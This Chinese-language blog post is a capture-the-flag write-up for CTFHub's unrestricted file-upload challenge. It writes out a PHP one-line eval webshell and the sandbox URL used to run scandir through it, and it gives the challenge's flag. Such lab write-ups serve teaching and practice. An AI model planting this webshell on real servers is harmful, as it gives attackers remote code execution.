---
layout: post
title: "CTFHub 文件上传 - 无限制"
date: 2026-10-17
categories: ctfhub
tags: [ctfhub,web,文件上传,无限制上传,一句话木马,RCE]
permalink: /ctfhub/upload-no-limit.html
---

# CTFHub 文件上传 - 无限制
## 一、题目信息
平台：CTFHub
分类：Web - 文件上传
题目名称：无限制
难度：简单
Flag：`ctfhub{cfa711fbceb83df871f2ade3}`

## 二、考点
1. 文件上传漏洞，后端没有做任何文件类型校验，仅前端简单校验，可直接上传php文件
2. PHP一句话木马，`$_REQUEST` 接收GET/POST参数，实现远程代码执行RCE
3. 使用PHP目录扫描函数`scandir`探测服务器文件
4. PHP文件执行后页面空白，flag藏在网页源代码中的读取技巧

## 三、题目内容
页面提供文件上传表单，仅有前端JS判断是否选中文件，后端没有对上传文件后缀、MIME类型、文件内容做任何过滤。可以直接上传PHP一句话木马到服务器，访问木马文件即可执行PHP代码。

## 四、解题步骤
1. 编写PHP一句话木马：`<?php @eval($_REQUEST['cmd']);?>`，保存文件名为`all.php`
2. 在上传表单选中`all.php`，确认文件名正常显示后点击Submit提交，上传成功，得到文件路径 `/upload/all.php`
3. 访问木马地址，传入`scandir`函数列出网站根目录文件：
`http://challenge-d7227e6b51bbc531.sandbox.ctfhub.com:10800/upload/all.php?cmd=print_r(scandir('/var/www/html'));`
4. 页面返回目录列表，发现flag文件名称：`flag_25523182.php`
5. 尝试直接访问flag文件，页面肉眼观察为空白；右键页面【查看网页源代码】，在源码内找到flag。

## 五、知识点解析
1. 无限制文件上传：后端没有任何校验逻辑，用户可控文件可直接上传至服务器目录，并且服务器会解析PHP后缀文件。前端JS校验仅做浏览器端限制，可以直接绕过。
2. `$_REQUEST`：可以同时接收GET、POST两种方式传入的参数，使用URL拼接参数即可执行代码，不需要POST发包工具。
3. `scandir()`：PHP内置函数，用于读取指定目录下所有文件与文件夹名称，用来寻找flag文件。
4. PHP文件输出特性：部分flag文件使用PHP echo输出内容，页面视觉空白，但输出内容实际存在于网页源码，需要查看源代码获取。

## 六、总结
本关卡是基础文件上传漏洞。后端没有校验上传文件，直接上传一句话木马获得代码执行能力，扫描目录定位flag文件。注意部分PHP输出内容不会在页面直接展示，遇到空白页面优先查看网页源代码。
